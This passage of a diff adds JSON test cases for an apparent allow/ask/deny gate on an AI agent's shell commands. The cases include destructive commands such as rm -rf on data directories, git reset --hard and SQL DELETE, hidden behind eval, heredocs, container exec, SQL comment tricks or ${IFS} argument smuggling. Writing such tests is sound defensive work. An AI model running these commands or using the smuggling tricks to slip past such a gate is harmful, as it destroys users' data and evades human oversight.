Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp Out-File LocalAppData Temp ; git reset --hard HEAD~5",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 heredoc delimiter with escaped space -> ask",
+  "Cmd": "cat <<A\\ B\nx\nA B\nrm -rf /home/x\nA",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 container bash heredoc pytest -> deny",
+  "Cmd": "docker compose exec -T api bash <<'EOF'\npytest -q\nEOF",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R3 echo pytest | container sh -> deny",
+  "Cmd": "echo pytest -q | docker compose exec -T api sh",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R3 container sh heredoc psql DELETE -> deny",
+  "Cmd": "docker exec -i db sh <<'EOF'\npsql -U postgres -c \"DELETE FROM tasks\"\nEOF",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R3 container sh heredoc rm -rf data -> ask",
+  "Cmd": "docker compose exec -T db sh <<'EOF'\nrm -rf /var/lib/postgresql/data\nEOF",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 eval rm -rf -> ask",
+  "Cmd": "eval 'rm -rf /home/x'",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R3 PS iex Remove-Item -> ask",
+  "Cmd": "iex \"Remove-Item -Recurse C:\\x\"",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 UPDATE/**/t SET -> deny",
+  "Cmd": "psql -c \"UPDATE/**/tasks SET a=1\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R3 MERGE INTO -> deny",
+  "Cmd": "psql -c \"MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN DELETE\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R3 python3 -Wonce -c DML -> deny",
+  "Cmd": "python3 -Wonce -c \"q='DELETE FROM tasks'\"",
+  "Expected": "deny"
+ },
+ {
+  "B": 1,
+  "Name": "R3 container-side rm -rf -> ask",
+  "Cmd": "docker compose exec -T db rm -rf /var/lib/postgresql/data",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 container-side git reset --hard -> ask",
+  "Cmd": "docker exec db git reset --hard",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "T": "PowerShell",
+  "Name": "R3 PS rm.exe -rf -> ask",
+  "Cmd": "rm.exe -rf C:\\x",
+  "Expected": "ask"
+ },
+ {
+  "B": 0,
+  "Name": "R3 unbound bind curl -w smuggling -> ask",
+  "Cmd": "curl -s http://localhost:8456/api/projects/by-name/x -w x${IFS}-o${IFS}/tmp/pwn",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R3 FP container psql SELECT -> allow",
+  "Cmd": "docker compose exec -T db psql -U postgres -c \"SELECT 1\"",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R3 FP compose logs -> allow",
+  "Cmd": "docker compose -p agent-teams logs --tail 50 api",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R3 FP container bash -c ls -> allow",
+  "Cmd": "docker exec -i web bash -c \"ls -la /app\"",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R3 FP continuation in curl -> allow",
+  "Cmd": "curl -s \\\n  -H \"X-Project-Id: 1\" \\\n  http://localhost:8456/api/tasks/1",
+  "Expected": "allow"
+ },
+ {
+  "B": 1,
+  "Name": "R1 git checkout -f -> ask",
+  "Cmd": "git checkout -f",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 git switch -f -> ask",
+  "Cmd": "git switch -f main",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 git push --mirror -> ask",
+  "Cmd": "git push --mirror origin",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 git update-ref -d -> ask",
+  "Cmd": "git update-ref -d refs/heads/dev",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 wget --method=DELETE -> ask",
+  "Cmd": "wget --method=DELETE http://localhost:8456/api/tasks/5",
+  "Expected": "ask"
+ },
+ {
+  "B": 1,
+  "Name": "R1 docker container rm -fv -> ask",
+  "Cmd": "docker container rm -fv agent-teams-db",
+  "Expected": "ask"
+ }
+]
